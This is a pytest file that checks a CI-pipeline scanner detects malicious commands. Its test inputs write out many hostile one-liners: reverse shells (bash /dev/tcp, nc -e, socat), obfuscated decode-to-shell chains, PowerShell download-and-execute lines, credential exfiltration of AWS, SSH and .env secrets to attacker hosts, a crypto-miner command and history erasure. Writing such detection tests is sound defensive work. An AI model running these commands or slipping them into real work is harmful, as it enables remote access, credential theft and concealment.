"""Per-pattern coverage for ``_malicious.py``.

Existing rule-level tests (``test_workflow_fixtures``,
``test_pipeline_poisoning``) exercise the wiring: do GHA-027 / GL-025
/ etc. surface a finding when the workflow contains a recognized
indicator. They don't, however, lock in *which* specific indicators trigger.
This file does. Add a new ``MaliciousPattern`` and you should add a
positive case here so a future tightening can't silently regress
recall.

The negative cases are deliberate: they assert that the example /
fixture / docs context-aware suppression keeps a benign mention from
firing. Those assertions also pin the suppression contract so a
``looks_like_example`` change can't quietly start letting real hits
through.
"""
from __future__ import annotations

import pytest

from pipeline_check.core.checks._malicious import find_malicious_patterns

# ──────────────────────────────────────────────────────────────────
# Existing patterns: smoke regression so a refactor can't drop them.
# ──────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("blob,expected_category", [
    # base64-decoded pipe to shell
    (
        "echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8= | base64 -d | sh",
        "obfuscated-exec",
    ),
    # bash /dev/tcp reverse shell
    (
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "reverse-shell",
    ),
    # netcat -e reverse shell
    (
        "nc 10.0.0.1 4444 -e /bin/bash",
        "reverse-shell",
    ),
    # xmrig miner binary
    (
        "./xmrig --url stratum+tcp://pool.minexmr.com:4444",
        "crypto-miner",
    ),
    # Discord webhook exfil
    (
        "curl -X POST https://discord.com/api/webhooks/1234567890/abcXYZ "
        "-d @secrets.json",
        "exfil-channel",
    ),
    # env to network exfil
    (
        "env | curl -X POST -d @- http://attacker.example/x",
        "credential-exfil",
    ),
    # history erasure
    ("history -c && exit 0", "audit-erasure"),
])
def test_existing_patterns_still_fire(blob: str, expected_category: str) -> None:
    cats = {c for c, _n, _e in find_malicious_patterns(blob)}
    assert expected_category in cats, (
        f"expected {expected_category!r} category match in: {blob!r}; "
        f"got {sorted(cats) or 'no matches'}"
    )


# ──────────────────────────────────────────────────────────────────
# New patterns: PowerShell IEX downloader, socat reverse shell,
# base64-encoded credential exfil.
# ──────────────────────────────────────────────────────────────────


class TestPowerShellIEXDownloader:
    def test_long_form_DownloadString(self) -> None:
        blob = (
            'IEX (New-Object Net.WebClient).DownloadString'
            '("http://attacker.example/payload.ps1")'
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_invoke_expression_alias(self) -> None:
        blob = (
            'Invoke-Expression (New-Object System.Net.WebClient).'
            'DownloadString("http://x/y")'
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_invoke_webrequest_pipe_to_iex(self) -> None:
        blob = "Invoke-WebRequest http://x/y.ps1 | IEX"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_iwr_pipe_to_iex(self) -> None:
        blob = "iwr http://attacker.example/p.ps1 | iex"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_does_not_fire_on_legitimate_iwr(self) -> None:
        # A WebRequest that doesn't pipe into IEX is not malicious.
        blob = "$resp = Invoke-WebRequest -Uri http://api.example/health"
        hits = find_malicious_patterns(blob)
        assert all("PowerShell" not in n for _c, n, _e in hits)


class TestSocatReverseShell:
    def test_tcp_listen_exec(self) -> None:
        blob = "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "reverse-shell" in cats

    def test_tcp_connect_back_system(self) -> None:
        blob = "socat TCP:10.0.0.1:4444 SYSTEM:'bash -i'"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "reverse-shell" in cats

    def test_openssl_tls_variant(self) -> None:
        blob = "socat OPENSSL:c2.example:443,verify=0 EXEC:/bin/sh"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "reverse-shell" in cats

    def test_does_not_fire_on_benign_socat(self) -> None:
        # socat used as a TCP relay, no shell exec. Should not fire.
        blob = "socat TCP-LISTEN:8080,fork TCP:upstream.local:80"
        hits = find_malicious_patterns(blob)
        assert all("socat" not in n.lower() for _c, n, _e in hits)


class TestBase64EncodedCredentialExfil:
    def test_aws_credentials_via_base64_curl(self) -> None:
        blob = (
            "base64 ~/.aws/credentials | curl -X POST "
            "-d @- http://attacker.example/x"
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "credential-exfil" in cats

    def test_dotenv_via_xxd_nc(self) -> None:
        blob = "xxd -p .env | nc 10.0.0.1 4444"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "credential-exfil" in cats

    def test_id_rsa_via_base64_wget(self) -> None:
        blob = "base64 ~/.ssh/id_rsa | wget --post-data=@- http://x/u"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "credential-exfil" in cats

    def test_does_not_fire_on_unrelated_base64(self) -> None:
        # base64 of a build asset is benign.
        blob = "base64 dist/bundle.js | curl -F file=@- https://upload.example/"
        hits = find_malicious_patterns(blob)
        assert all(
            "credential" not in c for c, _n, _e in hits
        ), f"unexpected credential-exfil match in: {blob!r}"


# ──────────────────────────────────────────────────────────────────
# Extended base64 obfuscation: long-form decode flag, here-string,
# openssl decoder, process substitution, curl-fetched encoded payload,
# decompress chains, plus the dash / ash shell-name fixes.
# ──────────────────────────────────────────────────────────────────


_B64 = "aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8="


class TestBase64DecodeLongForm:
    def test_long_decode_flag_to_bash(self) -> None:
        blob = f"echo {_B64} | base64 --decode | bash"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_bsd_uppercase_decode_flag(self) -> None:
        blob = f"echo {_B64} | base64 -D | sh"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_decode_into_dash_shell(self) -> None:
        # Previously ``dash`` was missed by the regex; widened
        # shell alternation now catches it.
        blob = f"echo {_B64} | base64 -d | dash"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_decode_into_ash_shell(self) -> None:
        # Alpine busybox ``ash`` is the default shell in Docker
        # build steps that derive from ``alpine``; common attacker
        # target.
        blob = f"echo {_B64} | base64 -d | ash"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats


class TestBase64HereString:
    def test_here_string_decoded_to_shell(self) -> None:
        blob = f'base64 -d <<< "{_B64}" | bash'
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_here_string_long_decode_flag(self) -> None:
        blob = f'base64 --decode <<< "{_B64}" | sh'
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats


class TestOpenSSLBase64Decoder:
    def test_openssl_base64_d(self) -> None:
        blob = f"echo {_B64} | openssl base64 -d | bash"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_openssl_enc_base64_d(self) -> None:
        blob = f"echo {_B64} | openssl enc -base64 -d | sh"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_openssl_short_a_flag(self) -> None:
        # ``openssl enc -a -d`` is the short form of ``-base64 -d``.
        blob = f"echo {_B64} | openssl enc -a -d -A | bash"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats


class TestProcessSubstitutionDecoded:
    def test_bash_process_sub_with_decode(self) -> None:
        blob = f'bash <(echo {_B64} | base64 -d)'
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_source_process_sub_with_curl_decode(self) -> None:
        blob = "source <(curl -sL http://attacker.example/p | base64 -d)"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_dot_alias_process_sub(self) -> None:
        # POSIX ``.`` (dot) is the portable equivalent of ``source``.
        blob = ". <(echo VEVTVA== | base64 --decode)"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats


class TestCurlFetchedEncodedPayload:
    def test_curl_to_b64_to_bash(self) -> None:
        blob = "curl -sL http://evil.example/payload | base64 -d | bash"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_wget_qOdash_to_b64_to_sh(self) -> None:
        blob = "wget -qO- http://evil.example/payload | base64 -d | sh"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_does_not_fire_on_plain_curl_pipe(self) -> None:
        # ``curl | bash`` without an encoded layer is GHA-016's
        # surface, not GHA-027's. The malicious-pack should not
        # claim it here.
        blob = "curl -sL https://get.docker.com | bash"
        hits = find_malicious_patterns(blob)
        assert all(
            "curl-fetched encoded" not in n for _c, n, _e in hits
        )


class TestDecodeDecompressChain:
    def test_b64_gunzip_bash(self) -> None:
        blob = f"echo {_B64} | base64 -d | gunzip | bash"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_b64_gzip_d_sh(self) -> None:
        blob = f"echo {_B64} | base64 -d | gzip -d | sh"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_b64_zcat_bash(self) -> None:
        blob = f"echo {_B64} | base64 --decode | zcat | bash"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats


class TestTrAndRevDecoding:
    def test_tr_rot13_to_shell(self) -> None:
        blob = (
            "echo 'cnzpcyB6Z3R0NDU0NDQ=' | "
            "tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash"
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_rev_to_shell(self) -> None:
        blob = 'echo "hsab- i- hsab" | rev | bash'
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_does_not_fire_on_benign_rev(self) -> None:
        # ``rev`` used for log presentation, no shell sink.
        blob = 'echo "$line" | rev > rotated.txt'
        hits = find_malicious_patterns(blob)
        assert all("rev-decoded" not in n for _c, n, _e in hits)


class TestInterpreterB64Eval:
    def test_python_base64_b64decode_exec(self) -> None:
        blob = (
            "python -c 'import base64;"
            f'exec(base64.b64decode("{_B64}"))\''
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_python3_codecs_base64_eval(self) -> None:
        blob = (
            "python3 -c \"import codecs;"
            f"eval(codecs.decode('{_B64}', 'base64'))\""
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_node_buffer_from_base64_eval(self) -> None:
        blob = (
            "node -e 'eval(Buffer.from(\""
            f"{_B64}\", \"base64\").toString())'"
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_node_function_constructor_base64(self) -> None:
        # ``Function(string)()`` is a common ``eval`` substitute.
        blob = (
            "node -e 'Function(Buffer.from(\""
            f"{_B64}\", \"base64\").toString())()'"
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_perl_decode_base64_eval(self) -> None:
        blob = (
            "perl -MMIME::Base64 -e '"
            f'eval(decode_base64("{_B64}"))\''
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_does_not_fire_on_python_base64_alone(self) -> None:
        # base64 round-trip without an exec/eval sink is benign
        # (build-time asset encoding).
        blob = (
            "python -c 'import base64;"
            "print(base64.b64encode(open(\"asset.bin\",\"rb\").read()))'"
        )
        hits = find_malicious_patterns(blob)
        assert all(
            "python b64decode" not in n for _c, n, _e in hits
        )


class TestPowerShellFromBase64String:
    def test_iex_frombase64string(self) -> None:
        blob = (
            'IEX ([System.Text.Encoding]::ASCII.GetString('
            f'[Convert]::FromBase64String("{_B64}")))'
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_invoke_expression_alias(self) -> None:
        blob = (
            "Invoke-Expression ([Text.Encoding]::UTF8.GetString("
            f'[System.Convert]::FromBase64String("{_B64}")))'
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats


# ──────────────────────────────────────────────────────────────────
# Suppression: example/fixture/docs context must not hide a real hit
# in production code, but must hide a literal mention inside an
# obvious example block.
# ──────────────────────────────────────────────────────────────────


def test_example_yaml_key_suppresses() -> None:
    # The reverse shell sits under an ``examples:`` key, well away from
    # production execution. Suppression should kick in.
    blob = (
        "jobs:\n"
        "  examples:\n"
        "    description: |\n"
        "      bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
    )
    cats = {c for c, _n, _e in find_malicious_patterns(blob)}
    assert "reverse-shell" not in cats, (
        "expected suppression under an 'examples:' YAML ancestor"
    )


def test_inline_example_comment_suppresses() -> None:
    blob = (
        "# example: red-team simulation payload\n"
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
    )
    cats = {c for c, _n, _e in find_malicious_patterns(blob)}
    assert "reverse-shell" not in cats


def test_production_match_still_fires_despite_inline_comment() -> None:
    # Inline ``// example`` annotation on a *separate* block must NOT
    # suppress a real hit elsewhere in the document. Suppression scope
    # is the local window, not the whole blob.
    blob = (
        "jobs:\n"
        "  prod-deploy:\n"
        "    steps:\n"
        "      - run: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        "\n"
        "# Old experiment, this was an example payload from training\n"
    )
    cats = {c for c, _n, _e in find_malicious_patterns(blob)}
    assert "reverse-shell" in cats, (
        "real reverse-shell in prod-deploy must still fire even when "
        "an unrelated 'example' comment appears later in the document"
    )
